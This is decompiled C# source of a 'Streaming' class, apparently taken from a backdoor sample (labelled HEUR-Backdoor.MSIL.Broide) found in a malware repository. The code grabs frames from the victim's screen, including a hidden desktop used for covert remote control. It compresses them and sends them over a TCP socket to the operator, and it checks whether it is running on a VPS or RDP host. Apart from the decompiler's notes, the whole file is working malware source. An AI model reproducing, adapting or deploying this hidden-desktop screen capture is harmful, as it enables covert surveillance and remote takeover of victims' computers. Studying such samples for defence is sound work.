// Decompiled with JetBrains decompiler
// Type: RemoteClient.Streaming
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Security;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RemoteClient
{
  public class Streaming : IDisposable
  {
    private bool chromeSetted;
    private bool ffSetted;
    private List<IntPtr> setted = new List<IntPtr>();
    private List<IntPtr> parrents = new List<IntPtr>();
    public static Size size;
    public static IntPtr ActiveDesktop;
    public static IntPtr defaultDesktop;
    public static IntPtr Hdsktp;
    public bool StopStream = true;
    public Socket tcpStream;
    public FastCodec StreamCodec;
    private byte[] delimiter = Encoding.ASCII.GetBytes("<EOF>");
    private static object sendLocker;

    public Streaming(Socket Param_369) => this.tcpStream = Param_369;

    public void StreamDefault()
    {
      Thread.CurrentThread.Priority = ThreadPriority.Highest;
      Bitmap bitmap;
      try
      {
        if ((Streaming.size.Width != 0 ? (Streaming.size.Height == 0 ? 1 : 0) : 1) != 0)
          throw new Exception();
        bitmap = new Bitmap(Streaming.size.Width, Streaming.size.Height, PixelFormat.Format24bppRgb);
      }
      catch
      {
        Streaming.size = Screen.PrimaryScreen.Bounds.Size;
        if ((Streaming.size.Width == 0 ? 1 : (Streaming.size.Height == 0 ? 1 : 0)) != 0)
        {
          Helpers.BrowserLogging("no monitor detected, may be VPS/RDP");
          this.StopStream = true;
          return;
        }
        bitmap = new Bitmap(Streaming.size.Width, Streaming.size.Height, PixelFormat.Format24bppRgb);
      }
      Native.SetThreatDesktop(Streaming.defaultDesktop);
      while (!this.StopStream)
      {
        try
        {
          Graphics graphics = Graphics.FromImage((Image) bitmap);
          graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
          BitmapData bitmapdata = bitmap.LockBits(new Rectangle(0, 0, Streaming.size.Width, Streaming.size.Height), ImageLockMode.ReadWrite, bitmap.PixelFormat);
          using (MemoryStream memoryStream = new MemoryStream())
          {
            try
            {
              this.StreamCodec.method_22(bitmapdata, memoryStream);
            }
            catch (Exception ex)
            {
              Helpers.BrowserLogging(ex.ToString());
            }
            if (memoryStream.ToArray().Length > 4)
            {
              try
              {
                List<byte> list = ((IEnumerable<byte>) this.Compress(((IEnumerable<byte>) memoryStream.ToArray()).ToList<byte>().ToArray())).ToList<byte>();
                list.AddRange((IEnumerable<byte>) this.delimiter);
                this.tcpStream.Receive(new byte[1]);
                this.tcpStream.BeginSend(list.ToArray(), 0, list.Count, SocketFlags.None, new AsyncCallback(this.SendCallback), (object) this.tcpStream);
              }
              catch
              {
              }
            }
            bitmap.UnlockBits(bitmapdata);
          }
          graphics.Dispose();
          GC.Collect();
        }
        catch (Exception ex)
        {
          Helpers.BrowserLogging(ex.ToString());
        }
      }
      this.StreamCodec.method_23();
      this.StreamCodec = (FastCodec) null;
      this.StopPacket();
    }

    [SuppressUnmanagedCodeSecurity]
    public void StreamAd()
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Streaming.Class35 class35 = new Streaming.Class35();
      // ISSUE: reference to a compiler-generated field
      class35.Class34_313 = this;
      Bitmap bitmap1;
      try
      {
        if (Streaming.size.Width == 0 || Streaming.size.Height == 0)
          throw new Exception();
        bitmap1 = new Bitmap(Streaming.size.Width, Streaming.size.Height, PixelFormat.Format24bppRgb);
      }
      catch
      {
        Streaming.size = Screen.PrimaryScreen.Bounds.Size;
        if ((Streaming.size.Width == 0 ? 1 : (Streaming.size.Height == 0 ? 1 : 0)) != 0)
        {
          Helpers.BrowserLogging("no monitor detected, may be VPS/RDP");
          this.StopStream = true;
          return;
        }
        bitmap1 = new Bitmap(Streaming.size.Width, Streaming.size.Height, PixelFormat.Format24bppRgb);
      }
      Native.SetThreatDesktop(Streaming.Hdsktp);
      Thread.CurrentThread.Priority = ThreadPriority.Highest;
      // ISSUE: reference to a compiler-generated field
      class35.List`1_314 = new List<IntPtr>();
      while (!this.StopStream)
      {
        try
        {
          // ISSUE: object of a compiler-generated type is created
          // ISSUE: variable of a compiler-generated type
          Streaming.Class36 class36 = new Streaming.Class36();
          // ISSUE: reference to a compiler-generated field
          class36.Class35_315 = class35;
          // ISSUE: reference to a compiler-generated field
          class36.int_140 = 0;
          // ISSUE: reference to a compiler-generated method
          Native.smethod_65(new Native.Class21(class36.method_159), IntPtr.Zero);
          // ISSUE: reference to a compiler-generated field
          for (int index = class36.int_140 - 1; index >= 0; --index)
          {
            Native.Class16 class16_1 = new Native.Class16();
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            Native.GetWindowRect(class36.Class35_315.List`1_314[index], out class16_1);
            if ((class16_1.property_8 != 0 ? (class16_1.property_7 != 0 ? 1 : 0) : 0) != 0)
            {
              if (index != 0)
              {
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                IntPtr num = class36.Class35_315.List`1_314[index - 1];
                Native.Class16 class16_2 = new Native.Class16();
                Native.GetWindowRect(num, out class16_2);
                if (class16_2.property_3 < class16_1.property_3 && class16_2.property_4 < class16_1.property_4 && class16_2.property_5 > class16_1.property_5 && class16_2.property_6 > class16_1.property_6)
                  continue;
              }
              using (Bitmap bitmap2 = new Bitmap(class16_1.property_8, class16_1.property_7, PixelFormat.Format24bppRgb))
              {
                using (Graphics graphics1 = Graphics.FromImage((Image) bitmap2))
                {
                  IntPtr hdc = graphics1.GetHdc();
                  // ISSUE: reference to a compiler-generated field
                  // ISSUE: reference to a compiler-generated field
                  Native.smethod_67(class36.Class35_315.List`1_314[index], hdc, 0);
                  graphics1.ReleaseHdc(hdc);
                  Native.smethod_90(hdc);
                  Graphics graphics2 = Graphics.FromImage((Image) bitmap1);
                  graphics2.DrawImage((Image) bitmap2, class16_1.property_3, class16_1.property_4);
                  graphics2.Dispose();
                }
              }
            }
          }
          BitmapData bitmapdata = (BitmapData) null;
          using (MemoryStream memoryStream = new MemoryStream())
          {
            try
            {
              bitmapdata = bitmap1.LockBits(new Rectangle(0, 0, Streaming.size.Width, Streaming.size.Height), ImageLockMode.ReadWrite, bitmap1.PixelFormat);
              if (bitmapdata.Scan0 == IntPtr.Zero)
              {
                Helpers.BrowserLogging("no monitor detected, may be VPS/RDP");
                continue;
              }
              this.StreamCodec.method_22(bitmapdata, memoryStream);
            }
            catch (Exception ex)
            {
              Helpers.BrowserLogging(ex.ToString());
            }
            if (memoryStream.ToArray().Length > 4)
            {
              List<byte> list = ((IEnumerable<byte>) this.Compress(((IEnumerable<byte>) memoryStream.ToArray()).ToList<byte>().ToArray())).ToList<byte>();
              list.AddRange((IEnumerable<byte>) this.delimiter);
              this.tcpStream.Receive(new byte[1]);
              this.tcpStream.BeginSend(list.ToArray(), 0, list.Count, SocketFlags.None, new AsyncCallback(this.SendCallback), (object) this.tcpStream);
            }
            bitmap1.UnlockBits(bitmapdata);
          }
          GC.Collect();
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          class36.Class35_315.List`1_314.Clear();
        }
        catch (Exception ex)
        {
          Helpers.BrowserLogging(ex.ToString());
        }
      }
      this.StreamCodec.method_23();
      this.StreamCodec = (FastCodec) null;
      this.StopPacket();
    }

    private void SendCallback(IAsyncResult Param_373)
    {
      lock (Streaming.sendLocker)
      {
        try
        {
          ((Socket) Param_373.AsyncState).EndSend(Param_373);
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
      }
    }

    private byte[] Compress(byte[] Param_375)
    {
      byte[] array;
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Compress))
        {
          gzipStream.Write(Param_375, 0, Param_375.Length);
          gzipStream.Close();
          array = memoryStream.ToArray();
        }
      }
      return array;
    }

    public void WaitReq(object Param_377)
    {
      byte num = (byte) Param_377;
      this.InitCodec();
      try
      {
        if (num != (byte) 0)
        {
          Helpers.InitHDesktop();
          new Thread(new ThreadStart(this.StreamAd)).Start();
        }
        else
        {
          Streaming.ActiveDesktop = Streaming.defaultDesktop;
          new Thread(new ThreadStart(this.StreamDefault)).Start();
        }
      }
      catch (Exception ex)
      {
        Helpers.BrowserLogging(ex.ToString());
      }
    }

    private void InitCodec()
    {
      Streaming.size = Helpers.GetScreenResolution();
      this.StreamCodec = new FastCodec(Streaming.size);
    }

    private void StopPacket()
    {
      try
      {
        this.tcpStream.BeginSend(new byte[4], 0, 4, SocketFlags.None, new AsyncCallback(this.SendCallback), (object) this.tcpStream);
      }
      catch
      {
      }
    }

    public void Dispose()
    {
      this.setted.Clear();
      this.setted.TrimExcess();
      this.parrents.Clear();
      this.parrents.TrimExcess();
      this.tcpStream.Shutdown(SocketShutdown.Both);
      this.tcpStream.Close();
      this.tcpStream.Dispose();
      if (this.StreamCodec != null)
      {
        this.StreamCodec.method_23();
        this.StreamCodec = (FastCodec) null;
      }
      GC.Collect();
    }

    static Streaming()
    {
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      int width = bounds.Width;
      bounds = Screen.PrimaryScreen.Bounds;
      int height = bounds.Height;
      Streaming.size = new Size(width, height);
      Streaming.defaultDesktop = Native.GetThreadDesktop(Native.GetCurrentThreadID());
      Streaming.sendLocker = new object();
    }
  }
}
